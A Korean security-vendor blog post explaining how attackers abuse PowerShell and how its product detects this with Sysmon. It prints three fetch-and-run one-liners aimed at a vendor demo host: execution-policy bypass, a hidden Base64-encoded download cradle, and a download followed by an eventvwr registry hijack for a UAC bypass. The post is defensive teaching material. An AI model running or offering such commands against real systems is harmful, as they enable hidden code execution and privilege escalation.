---
date: 2020-05-12T00:03:00
description: 
featured_image: 
tags: ["PowerShell", "악성코드", "웹 해킹", "보안 취약점", "PLURA"]
title: "PowerShell을 이용한 공격"
---

![2020-05-12](https://github.com/user-attachments/assets/a90db7c2-5c10-4f7e-b9d4-20c828b5a299)

## PowerShell

시스템 관리 및 자동화 등을 목적으로 설계된 명령줄 셸 및 스크립팅 언어입니다.  
Windows Vista 이후 기본 탑재되어 공격자의 도구로 많이 사용되고 있습니다.

### 1. 실행 정책 (Execution Policy)
기본적으로 Microsoft는 PowerShell 스크립트 실행을 제한합니다.  
그러나 공격자는 이를 쉽게 우회할 수 있습니다.  
> **우회 Flags**  
> -ExecutionPolicy/-EP Bypass  
> -ExecutionPolicy/-EP Unrestricted  
> -noprofile or -nop  
> *Profile Bypass: 각 세션이 시작될 때 PowerShell을 구성하기 위해 설정한 Profile도 무시할 수 있습니다.

### 2. 다운로드
PowerShell 클래스 및 메소드를 사용하여 악성 파일을 다운로드 및 실행합니다.  
> 악의적인 PowerShell 스크립트 명령줄에서 자주 사용되는 명령입니다.  
> New-Object: .NET Framework의 인스턴스를 만듭니다.  
> System.Net.Webclient: 원격 리소스와의 데이터 송수신에 사용됩니다.  
> DownloadString: 원격지에서 IEX가 실행할 메모리 버퍼로 내용을 다운로드합니다.  
> DownloadFile: 원격지에서 로컬 파일로 컨텐츠를 다운로드합니다.  
> IEX/Invoke-Expression: 로컬 컴퓨터에서 명령을 실행합니다.  
> ICM/Invoke-Command: 로컬 및 원격 컴퓨터에서 명령을 실행합니다.

### 3. 인코딩
- 인코딩은 PowerShell Command를 사용자 및 특정 로그에서 숨길 수 있는 한 가지 방법입니다.  
- Base64 인코딩을 사용한 경우 CommandLine의 길이가 길어집니다.  
- 인코딩 또한 우회되더라도, 장문의 명령어를 통해 불러온 PowerShell이라면 의심해볼 필요가 있습니다. ( > 500 is odd)

### 4. DLL
- 악의적인 행동을 탐지하려면, 의심스러운 호출의 조합을 찾아야 합니다.  
- PowerShell.exe 또는 PowerShell_ISE.exe 이외의 실행 파일에서 이러한 DLL이 호출되고 있는지 모니터링합니다.  
*sysmon id 7 (ImageLoaded)을 통해 확인 가능합니다.  
System.Management.Automation.Dll  
System.Management.Automation.ni.Dll  
System.Reflection.Dll

### 5. PLURA에서 PowerShell 악성 행위 탐지
*Sysmon 설치 필수  
설치 방법: [PLURA Sysmon 설치 가이드](https://docs.plura.io/ko/agents/edr/windows/sysmon)  

![ps-0-1](https://github.com/user-attachments/assets/7f971a25-61de-4a51-8e71-c4e861881576)

**악성 파일 실행**  
PowerShell 우회 및 공격자 서버로부터 파일 다운로드 행위 발생  
![ps-2-1](https://github.com/user-attachments/assets/11765e61-7cd0-4b98-8fce-026429934f1c)

**필터 탐지 > 호스트보안**  
PLURA에서는 이런 악의적인 공격을 Sysmon을 활용하여 필터 탐지하고 있습니다.

> **공격 명령어**  
```bash
powershell.exe -nop -NoProfile -WindowStyle 1 -c IEX (New-Object Net.WebClient).DownloadString('https://blog.plura.io/demo/testfile.exe')

cmd.exe /c Start /Min PowerShell.exe -NoP -NonI -EP ByPass -W Hidden -E JE9TPShHV21pIFdpbjMyX09wZXJhdGluZ1N5c3RlbSkuQ2FwdGlvbjskV0M9TmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50OyRXQy5IZWFkZXJzWydVc2VyLUFnZW50J109IlBvd2VyU2hlbGwvV0wgJE9TIjtJRVggJFdDLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmxvZy5wbHVyYS5pby9kZW1vL3Rlc3RmaWxlLnBocCcpOw==

cmd.exe /c powershell.exe -w hiddden -nop -ep bypass (New-Object System.Net.WebClient).DownloadFile('http://blog.plura.io/demo/sick.exe','%TEMP%\sick.exe') & reg add HKCU\SOFTWARE\Classes\mscfile\shell\open\command /d %tmp%\sick.exe /f & C:\Windows\system32\eventvwr.exe & PING -n 15 127.0.0.1>nul & %tmp%\sick.exe
```

악성 PowerShell 스크립트는 주로 email 첨부 파일의 다운로더로 사용되거나 침입 후 원격 컴퓨터에서 코드를 실행할 수 있습니다.  
PowerShell 위협에 대처하려면 보다 정교한 탐지 방법과 지속적인 모니터링 등의 노력이 필요합니다.

## 참조
- https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1511980157.pdf
- https://docs.broadcom.com/doc/increased-use-of-powershell-in-attacks-16-en
- https://www.ahnlab.com/kr/site/securityinfo/secunews/secuNewsView.do?seq=25651

## 관련 기사, 보안뉴스
- https://bit.ly/2V99SLF
